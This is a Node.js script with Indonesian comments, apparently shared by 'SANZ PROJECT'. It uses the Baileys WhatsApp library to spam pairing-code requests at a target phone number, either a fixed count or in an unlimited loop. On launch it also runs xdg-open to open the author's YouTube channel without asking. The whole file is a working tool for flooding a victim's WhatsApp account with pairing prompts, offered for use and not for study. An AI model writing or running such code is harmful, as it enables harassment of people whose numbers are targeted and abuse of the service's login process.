const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const { exec } = require("child_process"); // Import child_process untuk menjalankan perintah

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];

const KurumiColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { 
        rl.question(text, (answer) => {
            rl.close(); // Menutup readline setelah mendapatkan jawaban
            resolve(answer);
        });
    });
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms)); // Fungsi delay

async function KurumiProject() {
    console.log(KurumiColor + `
    [ A ] . Spam pairing biasa 
    [ B ] . Spam pairing unlimited 
    [ E ] . Keluar` + xColor);
    
    const pilihan = await question(KurumiColor + 'Pilih opsi: ' + xColor);

    if (pilihan.toLowerCase() === 'e') {
        console.log(KurumiColor + 'Program selesai.' + xColor);
        return;
    }

    const { state } = await useMultiFileAuthState('./69/session');
    const KurumiBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    
    try {
        const phoneNumber = await question(KurumiColor + 'Target (62xxxx): ' + xColor);

        if (pilihan.toLowerCase() === 'a') {
            const KurumiCodes = parseInt(await question(KurumiColor + 'Jumlah: ' + xColor));
            if (isNaN(KurumiCodes) || KurumiCodes <= 0) {
                console.log(KurumiColor + 'Contoh: 20.' + xColor);
                return;
            }
            for (let i = 0; i < KurumiCodes; i++) {
                try {
                    let code = await KurumiBotInc.requestPairingCode(phoneNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(KurumiColor + `${phoneNumber} [${i + 1}/${KurumiCodes}] Pairing Code: ${code}` + xColor);
                    await delay(2000); // Delay 2 detik antara setiap permintaan
                } catch (error) {
                    console.error(KurumiColor + 'Error: ' + error.message + xColor);
                    await delay(5000); // Delay 5 detik jika terjadi kesalahan
                }
            }
        } else if (pilihan.toLowerCase() === 'b') {
            console.log(KurumiColor + 'Spam pairing unlimited dimulai...' + xColor);
            let i = 0;
            while (true) {
                try {
                    let code = await KurumiBotInc.requestPairingCode(phoneNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(KurumiColor + `${phoneNumber} [${i + 1}] Pairing Code: ${code}` + xColor);
                    await delay(2000); // Delay 2 detik antara setiap permintaan
                    i++;
                } catch (error) {
                    console.error(KurumiColor + 'Error: ' + error.message + xColor);
                    await delay(5000); // Delay 5 detik jika terjadi kesalahan
                }
            }
        } else {
            console.log(KurumiColor + 'Opsi tidak valid.' + xColor);
        }
    } catch (error) {
        console.error(KurumiColor + 'Terjadi kesalahan: ' + error.message + xColor);
    }

    return KurumiBotInc;
}

// Menampilkan banner baru
console.log(KurumiColor + `
███████╗██████╗  █████╗ ███╗   ███╗    
██╔════╝██╔══██╗██╔══██╗████╗ ████║    
███████╗██████╔╝███████║██╔████╔██║    
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    
███████║██║     ██║  ██║██║ ╚═╝ ██║    
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝    

Author: SANZ PROJECT
YouTube: SANZ PROJECT
` + xColor);

// Membuka YouTube di awal
exec("xdg-open https://youtube.com/@sanzacil_026", (err) => {
    if (err) {
        console.error(KurumiColor + 'Gagal membuka YouTube: ' + err.message + xColor);
    }
});

// Menjalankan fungsi KurumiProject
KurumiProject();
